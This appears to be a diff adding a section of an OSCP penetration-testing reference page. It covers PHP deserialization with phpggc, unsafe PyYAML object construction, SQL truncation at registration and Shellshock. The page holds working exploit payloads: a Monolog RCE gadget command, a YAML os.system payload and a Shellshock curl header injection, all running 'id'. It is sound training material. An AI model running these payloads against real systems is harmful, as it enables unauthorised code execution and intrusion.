+<p>Use when a controlled serialized value reaches unsafe <code>unserialize()</code> and the required classes are loaded. Identify dependencies/builds from source or <code>composer.lock</code> first.</p>
+<pre><code class="language-bash"># Inspect available families and the exact chain's version/vector requirements
+phpggc -l
+phpggc -i Monolog/RCE1
+
+# Example function-call gadget, only when that chain matches the application
+phpggc -b Monolog/RCE1 system id > payload.b64
+</code></pre>
+<p>Read: base64 is a transport choice, not a bypass—the sink must decode it before deserialization. Preserve raw serialized lengths and binary bytes; use the encoding that the real request expects. A generated payload is not execution proof. Missing classes, rejected object types or a different dependency version → choose a matching chain or another primitive. Verify a benign effect before selecting a shell payload.</p>
+<p>Sources: <a href="https://github.com/ambionics/phpggc">upstream 1</a>.</p>
+<h2 id="unsafe-yaml-construction--distinguish-loading-from-safe-parsing">Unsafe YAML construction — distinguish loading from safe parsing</h2>
+<p>Use when source or errors identify Python YAML processing with an unsafe loader and you control the loaded YAML. An ordinary JSON field or <code>yaml.safe_load()</code> does not supply this condition.</p>
+<pre><code class="language-yaml">!!python/object/apply:os.system ["id"]
+</code></pre>
+<p>Put the probe in the actual YAML input/file, preserving its required surrounding structure. Read: attributable command output/effect supports unsafe construction. <code>ConstructorError</code> for the Python tag commonly indicates a loader that does not permit that constructor. Confirm the installed PyYAML version and loader (<code>UnsafeLoader</code>/unsafe load), rather than assuming that any use of YAML permits Python object execution.</p>
+<p>Sources: <a href="https://github.com/yaml/pyyaml">upstream 1</a>.</p>
+<h2 id="sql-truncation-or-normalization-mismatch-at-registration">SQL truncation or normalization mismatch at registration</h2>
+<p>Use when the application checks one representation for uniqueness but the DB stores or compares a different one—for example, an overlong username in a fixed-length column. Validate with a disposable account first.</p>
+<pre><code class="language-sql">-- With SQL visibility, inspect the real column and strict-mode behavior
+SELECT @@sql_mode;
+SELECT COLUMN_NAME, CHARACTER_MAXIMUM_LENGTH
+FROM information_schema.columns
+WHERE table_schema = DATABASE() AND table_name = 'users';
+</code></pre>
+<p>Compare registration/login behavior for the test name, its trailing-space form and an overlong form that would truncate to it. A plus character only becomes a space in the appropriate form encoding; it is not a universal SQL payload. A strict length error or a unique constraint on the normalized stored value can stop this path. Confirm an actual account/authorization change before calling it a bypass.</p>
+<p>Sources: <a href="https://dev.mysql.com/doc/refman/8.4/en/sql-mode.html">upstream 1</a>.</p>
+<h2 id="shellshock-candidate--only-for-a-cgi-path-that-invokes-vulnerable-bash">Shellshock candidate — only for a CGI path that invokes vulnerable Bash</h2>
+<p>Use when a confirmed CGI endpoint passes HTTP-derived environment variables into an affected Bash process. An arbitrary PHP/Java route or a Bash version string alone does not establish this chain.</p>
+<pre><code class="language-bash"># Bounded command-effect probe at the actual CGI script
+curl -i -H 'User-Agent: () { :;}; echo; /usr/bin/id' \
+  http://TARGET:PORT/cgi-bin/SCRIPT
+</code></pre>
+<p>Read: an attributable UID in the executed CGI response supports the effect; reflection of the header text does not. Header/CGI parsing errors require inspecting the request and script behavior. No effect → re-check the actual component and patch status before selecting another PoC. This is the CVE-2014-6271 family, not a generic command separator for every web input.</p>
+<p>Sources: <a href="https://nvd.nist.gov/vuln/detail/CVE-2014-6271">upstream 1</a>.</p>
+<h2 id="sources">Sources</h2>
+<p>Supplied PEN-200 Ch 9.4 pp274-279 and Ch 10 pp285-300; reviewed <a href="https://lizajose.github.io/getSH/web">getSH Web/SQLi route</a>; <a href="https://github.com/LeonardoE95/OSCP/tree/main/modules/web/03-sql-injection">Hexdump SQL injection module</a>; <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection">OWASP command injection testing</a>, <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection">OWASP SQL injection testing</a>; current <a href="https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide">OSCP+ exam guide</a>.</p></article><hr><p><a href="#document">Top of document</a> · <a href="/oscp/">Reference home</a></p></main></body></html>
